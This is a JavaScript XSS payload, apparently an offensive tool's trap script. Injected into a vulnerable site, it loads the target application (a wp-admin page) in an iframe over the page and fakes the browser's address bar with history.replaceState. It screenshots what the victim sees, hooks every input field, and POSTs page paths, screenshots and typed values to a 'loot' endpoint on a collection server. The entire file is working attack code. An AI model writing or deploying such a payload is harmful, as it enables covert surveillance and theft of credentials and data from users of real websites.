alert('Ready to launch trap?');




// Ue fullscreen for actual prod usage
// not fullscreen shows the XSS laden landing
// page in the background so you can 
// tell if you're still where you need to be during
// development. 
let fullscreenIframe = false; // Set to true for production use, false for dev


// What page in the application to start users in
// Note that if the trap is loading from
// a reload, it hopefully will automatically
// load the page the user was on in the iframe
// when they reloaded the page. Otherwise,
// they'll start here
let startingPage = "https://targetapp.possiblymalware.com/wp-admin";




// Helpful variables
let lastFakeUrl = "";


// Slow down the html2canvas
let loaded = false;


// Client session
var sessionName = "";

const AdjectiveList = [
	"funky",
	"smelly",
	"skunky",
	"merry",
	"whimsical",
	"amusing",
	"hysterical",
	"bumfuzzled",
	"bodacious",
	"absurd",
	"animated",
	"brazen",
	"cheesy",
	"clownish",
	"confident",
	"crazy",
	"cuckoo",
	"deranged",
	"ludicrous",
	"playful",
	"quirky",
	"screwball",
	"slapstick",
	"wacky",
	"excited",
	"humorous",
	"charming",
	"confident",
	"fanatical"
	];

const ColorList = [
	"blue",
	"red",
	"green",
	"white",
	"black",
	"brown",
	"azure",
	"pink",
	"yellow",
	"silver",
	"purple",
	"orange",
	"grey",
	"fuchsia",
	"crimson",
	"lime",
	"plum",
	"olive",
	"cyan",
	"ivory",
	"magenta"
	];

const MurderCritter = [
	"kangaroo",
	"koala",
	"dropbear",
	"wombat",
	"wallaby",
	"dingo",
	"emu",
	"tassiedevil",
	"platypus",
	"salty",
	"kookaburra",
	"boxjelly",
	"blueringoctopus",
	"taipan",
	"stonefish",
	"redback",
	"cassowary",
	"funnelwebspider",
	"conesnail"
	];



// *******************************************************************************

// Generate a session identifier
function initSession()
{
	var adjective = AdjectiveList[Math.floor(Math.random()*AdjectiveList.length)];
	var color = ColorList[Math.floor(Math.random()*ColorList.length)];
	var murderer = MurderCritter[Math.floor(Math.random()*MurderCritter.length)];
	sessionName = adjective + "-" + color + "-" + murderer;
}



// Snag a screenshot and ship it
function sendScreenshot()
{
	if (loaded == false)
	{
		console.log("!!! Waiting 3 seconds to init html2canvas!");
		setTimeout(function () {}, 3000);
		loaded = true;
	}
	console.log("---Snagging screenshot...");

//	html2canvas(document.getElementsByTagName("html")[0], {scale: 1}).then(canvas => 
	html2canvas(document.getElementById("iframe_a").contentDocument.getElementsByTagName("html")[0], {scale: 1}).then(canvas => 
	{
		function responseHandler() 
		{
			console.log(this.responseText)
		};

		console.log("About to send image....");
		request = new XMLHttpRequest();request.addEventListener("load", responseHandler);
		request.open("POST", "http://localhost:8444/loot/screenshot/" + sessionName);

		canvas.toBlob((blob) => 
		{
			const image = blob;
					// jsonData["screenshot"] = image;
					// var jsonString = JSON.stringify(jsonData);

			request.send(image);
		});
	}).catch(e => console.log(e));
}



// // Captures user inputs changes
// function updateInput(input)
// {
// 	inputName = input.target.name;
// 	inputValue = input.target.value;


// 	console.log("!!!! Input: " + inputName + " changed to: " + inputvalue);

// }




// Snag the path of the iframe, and fake it in the browser
// address bar. It'll look like they're surfing the site
// Note: if the user refreshes the page, the gig is up
// and your XSS will stop executing. But as long as they
// keep clicking around, you keep control and you XSS 
// keeps running
function updateUrl()
{
	var fakeUrl = document.getElementById("iframe_a").contentDocument.location.pathname;

	if (lastFakeUrl != fakeUrl)
	{
		// Handle URL recording
		console.log("New URL to fake!");
		console.log("url: " + fakeUrl);
		lastFakeUrl = fakeUrl;

		// This needs an API call to report the new page
		// and take a screenshot maybe, not sure if
		// screenshot timing will be right yet
		request = new XMLHttpRequest();
		request.open("POST", "http://localhost:8444/loot/location/" + sessionName);
		request.setRequestHeader("Content-Type", "application/json;charset=UTF-8");
		var jsonObj = new Object();
		jsonObj["url"] = fakeUrl;
		var jsonString = JSON.stringify(jsonObj);
		request.send(jsonString);

		// Handle screenshotting
		sendScreenshot();


		// Handle input scraping
		inputs = document.getElementById("iframe_a").contentDocument.getElementsByTagName('input');
		for (index = 0; index < inputs.length; index++)
		{
			//console.log("++ Registering input callballback for index: " + index)
			addEventListener(inputs[index], (event) => updateInput);
			inputs[index].addEventListener("change", function(){
				inputName = this.name;
				inputValue = this.value;
				console.log("!!!! Input: " + inputName + " changed to: " + inputValue);

				request = new XMLHttpRequest();
				request.open("POST", "http://localhost:8444/loot/input/" + sessionName);
				request.setRequestHeader("Content-Type", "application/json;charset=UTF-8");
				var jsonObj = new Object();
				jsonObj["inputName"] = inputName;
				jsonObj["inputValue"] = inputValue;
				var jsonString = JSON.stringify(jsonObj);
				request.send(jsonString);
			});


		}
	}
	else
		console.log("Fake URL doesn't need updating");

	//console.log("Fake url is: " + fakeUrl);
	window.history.replaceState(null, '', fakeUrl);
}






// Start the trap
function takeOver()
{

	document.body.style.backgroundColor = "pink";

	// Setup our iframe trap
	var iframe = document.createElement("iframe");
	iframe.setAttribute("src", startingPage);

	if (fullscreenIframe)
	{
		console.log("&& Using fullscreen");
		iframe.style.width  = "100%";
		iframe.style.height = "100%";
		iframe.style.top = "0px";
		iframe.style.left = "0px"
	}
	else
	{
		console.log("&& Using partial screen");
		iframe.style.width  = "80%";
		iframe.style.height = "80%";
		iframe.style.top = "50px";
		iframe.style.left = "50px";
	}
	iframe.style.position = "fixed";
	iframe.id = "iframe_a";
	document.body.appendChild(iframe);


	// Hook needed events below...

	// Just register all the darned events, each event in the iframe
	// we'll call updateUrl()
	var myIframe = document.getElementById('iframe_a');

	// Hook all the things for URL faking
	for(var key in myIframe){
		if(key.search('on') === 0) {
			myIframe.addEventListener(key.slice(2), updateUrl);
		}
	}

}

// ********************************************
// Go time

// Pull in html2canvas
var js = document.createElement("script");
js.type = "text/javascript";
js.src = "http://localhost:8444/lib/telemhelperlib.js";
document.body.appendChild(js);


// Pick our session ID
initSession();



// Trap all the things
takeOver();
